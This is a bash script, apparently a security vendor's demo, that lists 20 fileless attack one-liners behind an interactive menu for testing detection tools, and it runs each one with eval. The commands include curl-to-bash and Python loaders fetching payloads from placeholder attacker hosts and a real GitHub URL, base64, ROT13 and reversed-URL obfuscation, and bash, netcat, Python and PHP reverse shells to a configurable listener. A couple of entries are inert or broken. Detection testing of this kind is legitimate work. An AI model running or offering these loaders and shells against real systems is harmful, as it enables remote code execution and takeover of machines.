#!/usr/bin/env bash
# ============================================================
#  fileless-execution-demo.sh
#  Purpose : Show 20 different file-less attacks (incl. reverse
#            shells & loaders) to validate detection logic.
#  Author  : Lior Boehm   –  Upwind Security demo
# ============================================================
set -euo pipefail

########################################################################
# 0.  Banner
########################################################################
command -v figlet >/dev/null || { echo "figlet is required. Install it: sudo apt install figlet"; exit 1; }
clear
figlet "upwind.io"

CYAN=$(tput setaf 6); BOLD=$(tput bold); RESET=$(tput sgr0)
echo -e "${CYAN}${BOLD}Fileless Execution Demonstration by Lior Boehm${RESET}\n"

########################################################################
# 1.  Lab configuration – edit to match your network
########################################################################
LHOST="127.0.0.1"   # change to your listening box
LPORT1="4444"
LPORT2="5555"
LPORT3="9001"

########################################################################
# 2.  EXACTLY 20 file-less attack strings
########################################################################
#  ⚠️  Every line is *one* payload.  Do not break them across lines.
commands=(
#  1) Classic pipe-to-bash
"curl -s http://example.com/script.sh | bash"

#  2) FD process-substitution loader
"exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3"

#  3) Base64 → bash
"echo 'ZXhlYyAzPCA8KGN1cmwgLXMgPGh0dHA6Ly9iYWQuY29tL3BheWxvYWQuc2g+KTsgYmFzaCAvcHJvYy9zZWxmL2ZkLzM=' | base64 -d | bash"

#  4) Reversed URL obfuscation
"exec 3< <(echo 'hs.doaolyp/moc.dab//:ptth' | rev | xargs curl -s); bash /proc/self/fd/3"

#  5) FD-backed bash that fetches and runs another loader
"exec 3< /bin/bash; /proc/self/fd/3 -c 'curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/liorb-fileless.sh | bash'"

#  6) Pull Python code into variable, then eval
"X=\$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c \"\$X\""

#  7) Inline Python downloader / exec (no temp files)
"python3 - <<'PY'
import urllib.request, types, sys
mod = types.ModuleType(\"tmp\")
exec(urllib.request.urlopen('http://bad.com/p.py').read().decode(), mod.__dict__)
PY"

#  8) One-liner Perl eval loader
"perl -MIO -e 'print q(dummy) if 1'"

#  9) Bash /dev/tcp reverse shell – 2 s timeout
"timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &"

# 10) Netcat-e reverse shell – 2 s timeout
"timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &"

# 11) Python reverse shell – 2 s timeout
"timeout 2s python3 -c 'import os,pty,socket,sys,time; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &"

# 12) Obfuscated curl via sed tweak
"bash -c \"\$(curl -s https://gist.githubusercontent.com/attacker/raw/obf.sh | sed 's/PLACEHOLDER/real/')\""

# 13) ROT13 → base64 trick
"bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\""

# 14) Direct heredoc-style execution (no file)
"/bin/sh -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/liorb-fileless.sh)\""

# 15) openssl-decoded payload through FD
"exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8"

# 16) Second Bash /dev/tcp shell – 2 s timeout
"timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &"

# 17) Arbitrary FD chat to remote TCP socket
"exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &"

# 18) Python fetches b64 payload, decodes, passes to bash
"bash -c \"\$(python3 - <<'PY'
import urllib.request, base64, sys
print(base64.b64decode(urllib.request.urlopen(\"http://bad.com/b64\").read()).decode())
PY
)\""

# 19) PHP reverse shell – 2 s
"timeout 2s php -r '\$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"

# 20) dd + FD substitution chain
"exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s http://bad.com/shell.sh); bash /proc/self/fd/9"
)

########################################################################
# 3.  Helper – run indexed command in its own subshell
########################################################################
run_cmd() {
  local idx=$1
  local cmd="${commands[$idx]}"
  echo -e "\n[+] Running attack $((idx+1)):\n    $cmd"
  ( eval "$cmd" ) &   # background to keep menu responsive
}

########################################################################
# 4.  Interactive menu loop
########################################################################
while true; do
  echo -e "\n================== Attack Menu =================="
  for i in "${!commands[@]}"; do
    printf "  %2d) %s\n" "$((i+1))" "${commands[$i]%%$'\n'*}"
  done
  echo "   a) Run ALL attacks"
  echo "   q) Quit"
  read -rp $'\n'"Select option [1-20 | a | q]: " choice

  case "$choice" in
    [1-9]|1[0-9]|20) run_cmd $((choice-1)) ;;
    [Aa])            for i in "${!commands[@]}"; do run_cmd "$i"; done ;;
    [Qq])            echo "Bye!"; exit 0 ;;
    *)               echo "!! Invalid choice" ;;
  esac
done
